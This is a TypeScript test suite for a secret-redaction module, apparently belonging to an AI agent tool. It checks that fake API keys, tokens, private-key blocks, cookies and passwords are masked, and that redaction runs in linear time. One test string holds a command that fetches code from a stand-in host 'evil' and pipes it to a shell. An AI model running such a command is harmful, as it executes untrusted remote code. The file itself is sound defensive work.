import { describe, expect, it } from "vitest";
import { REDACTED, redact, truncate } from "../../src/index.js";
import { secretEnvValues, trailingSecretContext } from "../../src/agents/redact.js";
import { KEY_FORMS, OPENSSH_KEY, RSA_KEY, keyLines, leakedKeyBody } from "../fixtures/key-forms.js";

describe("redact", () => {
  it("redacts bearer tokens and sk-ant keys", () => {
    const out = redact("curl -H 'Authorization: Bearer sk-ant-TESTKEY000000abcdef'");
    expect(out).not.toContain("sk-ant");
    expect(out).toContain("Bearer [REDACTED]");
  });
  it("redacts known key formats", () => {
    const samples = [
      "sk-ant-TESTKEY000000abcdef",
      "sk-FAKEFAKEFAKEFAKEFAKE0000",
      "AKIAFAKEFAKEFAKE0000",
      "ghp_FAKEFAKEFAKEFAKEFAKE0000",
      "xoxb-FAKE-FAKE-FAKE0000",
      "AIza" + "F".repeat(35),
    ];
    for (const s of samples) {
      const out = redact(`token is ${s} ok`);
      expect(out).toBe(`token is ${REDACTED} ok`);
    }
  });
  it("redacts the value of KEY=value pairs", () => {
    expect(redact({ env: "ANTHROPIC_API_KEY=xyz123" })).toEqual({ env: "ANTHROPIC_API_KEY=[REDACTED]" });
    expect(redact("DB_PASSWORD=hunter2 other=1")).toBe("DB_PASSWORD=[REDACTED] other=1");
  });
  it("redacts values of secret-named object keys", () => {
    expect(redact({ apiKey: "abc", nested: [{ password: "p" }], name: "n" })).toEqual({
      apiKey: REDACTED,
      nested: [{ password: REDACTED }],
      name: "n",
    });
  });
  it("redacts a whole PEM block", () => {
    const pem = "-----BEGIN RSA PRIVATE KEY-----\nFAKEFAKE\nFAKE\n-----END RSA PRIVATE KEY-----";
    expect(redact(`a\n${pem}\nb`)).toBe(`a\n${REDACTED}\nb`);
  });
  it("applies extraSecrets longest first, so a shorter one never leaves a tail", () => {
    expect(redact("x abcdef y", ["abc", "abcdef"])).toBe(`x ${REDACTED} y`);
  });
  it("keeps a value that is only an environment-variable reference", () => {
    for (const ref of ["$FOO", "${FOO}", '"$FOO"', "'$FOO'", "%FOO%", "$env:FOO"]) {
      expect(redact(`export API_KEY=${ref}`)).toBe(`export API_KEY=${ref}`);
    }
    const cmd = 'curl -H "Authorization: Bearer $GITHUB_TOKEN" https://x.example';
    expect(redact(cmd)).toBe(cmd);
    expect(redact({ command: cmd })).toEqual({ command: cmd });
  });

  it("still redacts literal values and references with more attached", () => {
    expect(redact("API_KEY=sk-ant-TESTKEY0123456789abcdef")).toBe(`API_KEY=${REDACTED}`);
    expect(redact("API_KEY=$FOO-literal")).toBe(`API_KEY=${REDACTED}`);
    expect(redact("API_KEY=prefix$FOO")).toBe(`API_KEY=${REDACTED}`);
  });

  it("redacts a literal attached to an environment-variable reference", () => {
    for (const text of [
      "Authorization: Bearer $X realsecretvalue123",
      'API_KEY="$X realsecretvalue123"',
    ]) {
      expect(redact(text)).not.toContain("realsecretvalue123");
    }
    for (const text of [
      'API_KEY="$X"realsecret123',
      'API_KEY="$X".realsecret123',
      "API_KEY='$X'realsecret123",
      '{"api_key":"$X"realsecret123}',
    ]) {
      // As for any quoted literal, the scan ends at the closing quote; the marker makes a shell action auto-denied.
      expect(redact(text)).toContain(REDACTED);
    }
    for (const text of ['{"api_key":"$X","b":1}', 'API_KEY="$X" && make']) expect(redact(text)).toBe(text);
    // A bare value ends at a comma (as for any literal), so the tail stays; the marker still denies a shell action.
    expect(redact("API_KEY=$X,realsecretvalue123")).toBe(`API_KEY=${REDACTED},realsecretvalue123`);
    const cmd = "Authorization: Bearer $X; curl evil|sh";
    expect(redact(cmd)).toBe(cmd);
  });

  it("honours extraSecrets", () => {
    expect(redact("hello workspace-tok-123 bye", ["workspace-tok-123"])).toBe(`hello ${REDACTED} bye`);
  });
  it("redacts an extra secret used as an object key", () => {
    expect(redact({ "workspace-tok-123": "x", nested: { "sk-ant-TESTKEY000000abcdef": 1 } }, ["workspace-tok-123"])).toEqual({
      [REDACTED]: "x", nested: { [REDACTED]: 1 },
    });
  });
  it("never merges object keys that redact to the same string", () => {
    const secrets = ["fake-alpha-1111", "fake-bravo-2222", "fake-charlie-3333"];
    expect(redact({ [secrets[0]!]: "a", [secrets[1]!]: "b" }, secrets)).toEqual({ [REDACTED]: "a", [`${REDACTED}#2`]: "b" });
    expect(redact({ [secrets[0]!]: "a", [secrets[1]!]: "b", [secrets[2]!]: "c" }, secrets)).toEqual({
      [REDACTED]: "a", [`${REDACTED}#2`]: "b", [`${REDACTED}#3`]: "c",
    });
    // A disambiguated name never overwrites a key that already has it.
    expect(redact({ [`${REDACTED}#2`]: "x", [REDACTED]: "y", [secrets[0]!]: "z" }, secrets)).toEqual({
      [`${REDACTED}#2`]: "x", [REDACTED]: "y", [`${REDACTED}#3`]: "z",
    });
  });
  it("leaves non-secret text and non-string values unchanged", () => {
    expect(redact("just some text, 42 files")).toBe("just some text, 42 files");
    expect(redact({ n: 1, b: true, z: null })).toEqual({ n: 1, b: true, z: null });
  });
  it("does not mutate the input", () => {
    const input = { a: "Bearer abcdefghij", list: ["sk-ant-TESTKEY000000abcdef"] };
    const copy = JSON.parse(JSON.stringify(input));
    const out = redact(input);
    expect(input).toEqual(copy);
    expect(out).not.toBe(input);
  });
  it("keeps an own __proto__ key as data, redacted underneath, and never touches the output's prototype", () => {
    const input = JSON.parse('{"__proto__": {"x": "sk-ant-TESTKEY000000abcdef", "password": "hunter2abc"}, "a": 1}') as Record<string, unknown>;
    const out = redact(input) as Record<string, unknown>;
    expect(Object.getPrototypeOf(out)).toBe(Object.prototype);
    expect(Object.hasOwn(out, "__proto__")).toBe(true);
    expect(JSON.stringify(out)).toBe('{"__proto__":{"x":"[REDACTED]","password":"[REDACTED]"},"a":1}');
    expect("x" in out).toBe(false); // nothing landed on the prototype chain
    expect(Object.hasOwn({}, "x")).toBe(false);
  });
});

describe("redact: leak fixes", () => {
  const r = (s: string) => redact(s);
  it("redacts quoted values, keeping the quotes", () => {
    expect(r('export DB_PASSWORD="hunter2 with space"')).toBe(`export DB_PASSWORD="${REDACTED}"`);
    expect(r("export OPENAI_API_KEY='shortsecretval'")).toBe(`export OPENAI_API_KEY='${REDACTED}'`);
  });
  it("redacts an unterminated PEM block and PGP blocks", () => {
    const out = r("x -----BEGIN PRIVATE KEY-----\nFAKEBODYFAKEBODY\nmore");
    expect(out).toBe(`x ${REDACTED}`);
    expect(r("-----BEGIN PGP PRIVATE KEY BLOCK-----\nFAKE\n-----END PGP PRIVATE KEY BLOCK-----!")).toBe(`${REDACTED}!`);
  });
  it("handles case-insensitive Bearer and Basic", () => {
    expect(r("authorization: bearer abcdef123456")).toBe(`authorization: bearer ${REDACTED}`);
    expect(r("Authorization: Basic dXNlcjpwYXNzd29yZA==")).toBe(`Authorization: Basic ${REDACTED}`);
  });
  it("redacts header, JSON and YAML key syntaxes", () => {
    expect(r("x-api-key: FAKEVALUE1")).toBe(`x-api-key: ${REDACTED}`);
    expect(r("anthropic-api-key: FAKEVALUE1")).toBe(`anthropic-api-key: ${REDACTED}`);
    expect(r('{"password": "pw with space", "user": "bob"}')).toBe(`{"password": "${REDACTED}", "user": "bob"}`);
    expect(r("client_secret: FAKEVALUE1\nname: x")).toBe(`client_secret: ${REDACTED}\nname: x`);
    expect(r("Cookie: a=1; b=2\nHost: example.com")).toBe(`Cookie: ${REDACTED}\nHost: example.com`);
    expect(r("Set-Cookie: sid=FAKE; Path=/")).toBe(`Set-Cookie: ${REDACTED}`);
    expect(r("AWS_SECRET_ACCESS_KEY=FAKEFAKE")).toBe(`AWS_SECRET_ACCESS_KEY=${REDACTED}`);
  });
  it("redacts URL userinfo", () => {
    expect(r("git clone https://user:FAKEPASS@example.com/x.git")).toBe(
      `git clone https://user:${REDACTED}@example.com/x.git`,
    );
    expect(r("https://x-access-token:ghs_" + "F".repeat(24) + "@example.com/x")).toBe(
      `https://x-access-token:${REDACTED}@example.com/x`,
    );
  });
  it("redacts more token shapes", () => {
    const samples = [
      "github_pat_" + "F".repeat(25),
      "npm_" + "F".repeat(25),
      "sk_live_" + "F".repeat(12),
      "rk_test_" + "F".repeat(12),
      "ASIA" + "F".repeat(16),
      "eyJhbGciOiJGQUtF.eyJzdWIiOiJGQUtF.FAKESIG",
      "https://hooks.slack.com/services/TFAKE/BFAKE/FAKEFAKE",
    ];
    for (const s of samples) expect(r(`a ${s} b`)).toBe(`a ${REDACTED} b`);
  });
  it("keeps ordinary words and counters", () => {
    expect(r("task-management-system-name-here")).toBe("task-management-system-name-here");
    expect(redact({ max_tokens: 5, author: "x" })).toEqual({ max_tokens: 5, author: "x" });
  });
  it("redacts whole non-string values under secret keys", () => {
    expect(redact({ password: 12345678, token: ["abc"], secret: { v: "plain" } })).toEqual({
      password: REDACTED,
      token: REDACTED,
      secret: REDACTED,
    });
  });
  it("redacts secret pairs that follow a non-secret key or separator", () => {
    expect(r("docker run --env=API_KEY=FAKESECRET1 img")).toBe(`docker run --env=API_KEY=${REDACTED} img`);
    expect(r("env: API_KEY=FAKESECRET1")).toBe(`env: API_KEY=${REDACTED}`);
    expect(r("https://x.com/api?access_token=FAKESECRET1&b=1")).toBe(`https://x.com/api?access_token=${REDACTED}&b=1`);
    expect(r("note:password=FAKESECRET1")).toBe(`note:password=${REDACTED}`);
    expect(r("x=DB_PASSWORD=FAKESECRET1")).toBe(`x=DB_PASSWORD=${REDACTED}`);
    expect(r("ENV:SECRET_KEY=FAKESECRET1")).toBe(`ENV:SECRET_KEY=${REDACTED}`);
  });
  it("redacts long and multi-line quoted values entirely", () => {
    const long = "a".repeat(5000);
    expect(r(`password="${long}"`)).toBe(`password="${REDACTED}"`);
    expect(r(`password='${long}' x`)).toBe(`password='${REDACTED}' x`);
    expect(r(`Cookie: "${long}"`)).toBe(`Cookie: "${REDACTED}"`);
    expect(r('password="line1\nline2" after')).toBe(`password="${REDACTED}" after`);
    expect(r('password="line1\nline2')).toBe(`password="${REDACTED}`);
  });
  it("treats only known counters as non-secret tokens", () => {
    expect(r("GITHUB_TOKENS=FAKESECRET1")).toBe(`GITHUB_TOKENS=${REDACTED}`);
    expect(redact({ github_tokens: "FAKESECRET1" })).toEqual({ github_tokens: REDACTED });
    expect(redact({ max_tokens: 1, input_tokens: 2, max_output_tokens: 3, maxTokens: 4 })).toEqual({
      max_tokens: 1,
      input_tokens: 2,
      max_output_tokens: 3,
      maxTokens: 4,
    });
  });
  it("redacts the whole value when part of it was already redacted", () => {
    expect(r("Authorization: Bearer abc.def!FAKE")).toBe(`Authorization: Bearer ${REDACTED}`);
    expect(r("GITHUB_TOKEN=ghp_" + "F".repeat(36) + "!FAKE")).toBe(`GITHUB_TOKEN=${REDACTED}`);
    expect(r("password=sk-ant-ABCDEFGHIJKL.FAKESECRET1")).toBe(`password=${REDACTED}`);
    expect(redact("password=abcFAKESECRET1", ["abc"])).toBe(`password=${REDACTED}`);
    expect(redact("Cookie: abcFAKESECRET1", ["abc"])).toBe(`Cookie: ${REDACTED}`);
    expect(r("password=[REDACTED]FAKESECRET1")).toBe(`password=${REDACTED}`);
    expect(r("password=[REDACTED]")).toBe(`password=${REDACTED}`);
  });
  it("redacts JSON embedded in a string", () => {
    expect(r('"{\\"password\\":\\"FAKESECRET1\\",\\"user\\":\\"bob\\"}"')).toBe(
      '"{\\"password\\":\\"' + REDACTED + '\\",\\"user\\":\\"bob\\"}"',
    );
  });
  it("redacts quoted header values and whole header lines", () => {
    expect(r('Cookie: sid="FAKE"; other=1')).toBe(`Cookie: ${REDACTED}`);
    expect(r('Authorization: Digest username="u", response="FAKERESP"\nHost: example.com')).toBe(
      `Authorization: Digest ${REDACTED}\nHost: example.com`,
    );
    expect(r("x-api-key: FAKE VALUE")).toBe(`x-api-key: ${REDACTED}`);
  });
  it("redacts YAML block scalars", () => {
    for (const ind of ["|", ">", "|-", ">-"]) {
      expect(r(`a: 1\npassword: ${ind}\n  FAKE1\n  FAKE2\nnext: x`)).toBe(`a: 1\npassword: ${REDACTED}\nnext: x`);
    }
    expect(r("  cfg:\n    secret: |\n      FAKE\n    keep: y")).toBe(`  cfg:\n    secret: ${REDACTED}\n    keep: y`);
  });
  it("keeps usage counters readable", () => {
    const usage = {
      cache_read_input_tokens: 1,
      cache_creation_input_tokens: 2,
      reasoning_tokens: 3,
      tokens: 4,
      cacheReadInputTokens: 5,
      outputTokens: 6,
    };
    expect(redact(usage)).toEqual(usage);
    expect(r("tokens=5 output_tokens: 7")).toBe("tokens=5 output_tokens: 7");
  });
  it("redacts the rest of a raw header line even when the value starts with a quote", () => {
    expect(r('Cookie: "a"; sid=FAKESECRET1')).toBe(`Cookie: ${REDACTED}`);
    expect(r("Cookie: 'a'; sid=FAKESECRET1")).toBe(`Cookie: ${REDACTED}`);
    expect(r('Authorization: Bearer "x" FAKESECRET1')).toBe(`Authorization: Bearer ${REDACTED}`);
    expect(r('Authorization: Digest "u", response="FAKESECRET1"\nHost: example.com')).toBe(
      `Authorization: Digest ${REDACTED}\nHost: example.com`,
    );
    expect(r('Cookie: "a\nFAKESECRET1" tail\nHost: x')).toBe(`Cookie: ${REDACTED}\nHost: x`);
  });
  it("keeps JSON valid for quoted header keys", () => {
    expect(r('{"Cookie": "a", "sid": "x"}')).toBe(`{"Cookie": "${REDACTED}", "sid": "x"}`);
    expect(r('{\\"Cookie\\":\\"a\\",\\"n\\":1}')).toBe(`{\\"Cookie\\":\\"${REDACTED}\\",\\"n\\":1}`);
  });
  it("skips only URL userinfo that was already redacted", () => {
    for (const s of [
      "a://password=FAKESECRET1",
      "redis://secret=FAKESECRET1",
      "s3://token=FAKESECRET1",
      "x://token:FAKESECRET1 rest",
      "git://token:FAKESECRET1",
      "x://password:FAKESECRET1/path",
      "https://token:FAKE/SECRET1@host",
    ]) {
      const out = r(s);
      expect(out).toContain(REDACTED);
      expect(out).not.toContain("SECRET1");
    }
    expect(r("https://token:FAKESECRET1@example.com/x")).toBe(`https://token:${REDACTED}@example.com/x`);
  });
  it("tracks inner escaping in double-encoded JSON", () => {
    const enc = JSON.stringify(JSON.stringify({ password: 'FA"KE1', user: "bob" }));
    const out = r(enc);
    expect(out).not.toContain("KE1");
    expect(JSON.parse(JSON.parse(out))).toEqual({ password: REDACTED, user: "bob" });
    const enc2 = JSON.stringify(JSON.stringify({ password: "FA\\", user: "bob" }));
    expect(JSON.parse(JSON.parse(r(enc2)))).toEqual({ password: REDACTED, user: "bob" });
  });
  it("recognises YAML block headers with indentation digits and comments", () => {
    for (const h of ["|2", "|-2", ">2-", "|+", "| # comment", "|2 # c"]) {
      expect(r(`password: ${h}\n  FAKE1\nnext: x`)).toBe(`password: ${REDACTED}\nnext: x`);
    }
  });
  it("redacts YAML block bodies with CR-only and CRLF line breaks", () => {
    expect(r("password: |\r  FAKE1\r  FAKE2\rnext: x")).toBe(`password: ${REDACTED}\rnext: x`);
    expect(r("a: 1\r  password: |\r    FAKE1\r  keep: y")).toBe(`a: 1\r  password: ${REDACTED}\r  keep: y`);
    expect(r("password: |\r\n  FAKE1\r\n  FAKE2\r\nnext: x")).toBe(`password: ${REDACTED}\r\nnext: x`);
  });
  // Growth, not an absolute bound: a slow or loaded runner (Windows CI) slows both sizes alike, while a quadratic
  // path takes four times as long on twice the input. Each size is timed after a warm-up, best of three.
  it("is linear on large input", { timeout: 120_000 }, () => {
    const time = (input: string): number => {
      let best = Infinity;
      for (let i = 0; i < 3; i++) {
        const t = performance.now();
        redact(input);
        best = Math.min(best, performance.now() - t);
      }
      return best;
    };
    const inputs: ((k: number) => string)[] = [
      (k) => "a".repeat(1_000_000 * k),
      (k) => "some words here key=value and more text sk-notasecret ".repeat(20_000 * k),
      (k) => 'k="'.repeat(300_000 * k),
      (k) => " ".repeat(1_000_000 * k) + "a",
      (k) => "a=b=c=".repeat(170_000 * k),
      (k) => '"'.repeat(1_000_000 * k),
      (k) => 'password="'.repeat(100_000 * k),
      (k) => '\\"password\\":\\"'.repeat(60_000 * k),
      (k) => "password: |\n".repeat(80_000 * k),
      (k) => "password: |\n  x\n".repeat(60_000 * k),
      (k) => "Cookie: \"a\" ".repeat(100_000 * k),
      (k) => "Cookie: 'a'; ".repeat(80_000 * k) + "\n",
      (k) => "x://token:".repeat(100_000 * k),
      (k) => "https://token:[REDACTED]@".repeat(40_000 * k),
      (k) => '\\"password\\":\\"' + '\\\\\\"'.repeat(150_000 * k),
      (k) => '\\"password\\":\\"\\\\'.repeat(60_000 * k),
      (k) => "password: |2 # c\n".repeat(60_000 * k),
      (k) => "password: | # password: | #".repeat(40_000 * k) + "\r",
      (k) => "password: |\r".repeat(40_000 * k),
      (k) => "password: | #\r".repeat(70_000 * k),
      (k) => "password: |\r  x\r".repeat(60_000 * k),
      (k) => "x\r".repeat(300_000 * k) + "password: |\r  FAKE1\r".repeat(30_000 * k),
    ];
    for (const input of inputs) {
      const once = input(1);
      const twice = input(2);
      redact(once); // warm-up: JIT and regex compilation are not part of the growth
      const t1 = time(once);
      const t2 = time(twice);
      // A floor of 10 ms keeps timer resolution and scheduler noise from deciding a case that is fast at both sizes.
      expect(t2, `${once.slice(0, 24)}… took ${t1.toFixed(1)} ms, twice as long input ${t2.toFixed(1)} ms`).toBeLessThanOrEqual(3 * Math.max(t1, 10));
    }
  });
});

describe("truncate", () => {
  it("never exceeds max, even below the marker length", () => {
    expect(truncate("x".repeat(50), 0)).toBe("");
    expect(truncate("x".repeat(50), 5)).toHaveLength(5);
    expect(truncate("x".repeat(50), 12)).toBe("…[truncated]");
  });
  it("returns short strings unchanged", () => expect(truncate("abc", 3)).toBe("abc"));
  it("cuts to exactly max with a marker", () => {
    const out = truncate("x".repeat(100), 40);
    expect(out).toHaveLength(40);
    expect(out.endsWith("…[truncated]")).toBe(true);
  });
});

describe("secretEnvValues", () => {
  it("returns the values of variables whose name looks secret", () => {
    const env = {
      FAKE_SERVICE_TOKEN: "fake-token-value-0001",
      MY_PASSWORD: "fake-password-0002",
      OTHER_API_KEY: "sk-ant-TESTKEY0123456789abcdef",
      PATH: "/usr/bin",
      HOME: "/Users/a",
      MAX_TOKENS: "4096000000",
      EMPTY_SECRET: "",
      UNSET_SECRET: undefined,
    };
    expect(secretEnvValues(env).sort()).toEqual(["fake-password-0002", "fake-token-value-0001", "sk-ant-TESTKEY0123456789abcdef"]);
  });

  it("ignores values too short to redact safely", () => {
    expect(secretEnvValues({ SOME_TOKEN: "1", DEBUG_AUTH: "true", X_SECRET: "1234567" })).toEqual([]);
  });
});

describe("trailingSecretContext", () => {
  it("finds a trailing auth scheme or secret key, with or without its separator", () => {
    for (const [head, context] of [
      ["see Authorization: Bearer ", "Bearer "],
      ["see Authorization: ", "Authorization: "],
      ["curl -H x Basic ", "Basic "],
      ["then api_key = ", "api_key = "],
      ["then api_key ", "api_key "],
      ['{"password": ', '"password": '.slice(1)],
      ["db:\n  password: |\n", "password: |\n"],
      ["token:\n", "token:\n"],
      ['{"a":1,"password":"ab', 'password":"ab'],
      ["db:\n  password: |\n    one\n\n    two\n", "  password: |\n    one\n\n    two\n"],
    ] as const) {
      expect(trailingSecretContext(head, false)).toBe(head.length - context.length);
    }
  });

  it("finds nothing after ordinary text, a non-secret key or a counter", () => {
    for (const head of ["hello world ", "name = ", "max_tokens: ", "Bearer token value ", '{"password":"ab","n":"x', "db:\n  password: |\n    one\n  other: x\n"]) {
      expect(trailingSecretContext(head, false)).toBe(-1);
    }
  });

  it("judges a block-scalar header on the first line only when the text is known to start at a line boundary", () => {
    const head = "password: |\n  hunter2abc\n  more";
    expect(trailingSecretContext(head, true)).toBe(0);
    expect(trailingSecretContext(head, false)).toBe(-1); // the first line may be the tail of a longer one
    expect(trailingSecretContext(`x: 1\n${head}`, true)).toBe(5);
    expect(trailingSecretContext(`x: 1\n${head}`, false)).toBe(5);
    expect(trailingSecretContext("password: |\n  one\nother: x\n", true)).toBe(-1); // the block has ended
  });

  it("finds a block-scalar header that is not at the start of its line, and steps back to the key itself", () => {
    const head = '{"x":1}password: |\n  hunter2abc\n  more\n';
    expect(trailingSecretContext(head, true)).toBe(7);
    expect(trailingSecretContext(`a\n${head}`, false)).toBe(9);
    expect(trailingSecretContext("a\n- item: 1\n  secret_key: |\n    one\n", false)).toBe(12); // after a list item, the key
    expect(trailingSecretContext("a\n  - password: |\n      one\n", false)).toBe(2); // a header that is the whole item keeps its indentation
    expect(trailingSecretContext('a\n{"x":1}name: |\n  one\n', false)).toBe(-1); // not a secret key
    expect(trailingSecretContext('a\n{"x":1}password: |\n  one\nnext: 2\n', false)).toBe(-1); // the block has ended
  });
});

describe("redact: decorated private keys", () => {
  for (const key of [RSA_KEY, OPENSSH_KEY]) {
    for (const [form, render] of Object.entries(KEY_FORMS)) {
      it(`redacts a ${key.label} shown ${form} from BEGIN to END, with nothing of the body left`, () => {
        const text = `before\n${render(key)}after\n`;
        const out = redact(text);
        expect(out).toContain(REDACTED);
        expect(leakedKeyBody(out, key)).toBeNull();
        expect(out).not.toContain("-----BEGIN");
        expect(out).not.toContain("-----END");
        expect(out.startsWith("before\n")).toBe(true);
        expect(out.endsWith("after\n")).toBe(true);
      });
    }
  }

  it("redacts a key whose body lines are interleaved with prose, through its END line", () => {
    const lines = keyLines(RSA_KEY);
    lines.splice(4, 0, "An ordinary sentence placed inside the key on purpose.");
    const out = redact(`${lines.join("\n")}\n`);
    expect(out).toBe(`${REDACTED}\n`);
  });

  it("stays well under 10 ms on 16 KiB of adversarial key markers", () => {
    const size = 16 * 1024;
    const fill = (unit: string) => unit.repeat(Math.ceil(size / unit.length)).slice(0, size);
    const inputs = [
      `-----BEGIN PRIVATE KEY-----\n${fill("A ")}`, // an open block that never ends
      `-----BEGIN PRIVATE KEY-----\n${fill("-----END PRIVATE KE\n")}`, // near-miss END markers
      `-----BEGIN PRIVATE KEY-----\n-----END ${fill("A")}`, // one END with a label that never completes
      `-----BEGIN PRIVATE KEY-----\n${fill(`-----END ${"A".repeat(100)}\n`)}`, // many such labels
      `-----BEGIN ${fill("A ")}`, // a BEGIN whose label never completes
      fill("-----BEGIN PRIVATE KEY-----\n"), // nothing but BEGIN lines
      fill("-----BEGIN PRIVATE KEY-----\nx\n-----END PRIVATE KEY-----\n"), // many closed blocks
      fill("-----END PRIVATE KEY-----\n"), // nothing but END lines
      fill(`${RSA_KEY.body.slice(0, 64)}\n`), // a body with no markers at all
    ];
    for (const input of inputs) {
      expect(input.length).toBeGreaterThanOrEqual(size);
      redact(input); // warm up
      let best = Infinity;
      for (let n = 0; n < 3; n++) {
        const t = performance.now();
        redact(input);
        best = Math.min(best, performance.now() - t);
      }
      expect(best).toBeLessThan(10);
    }
  });
});
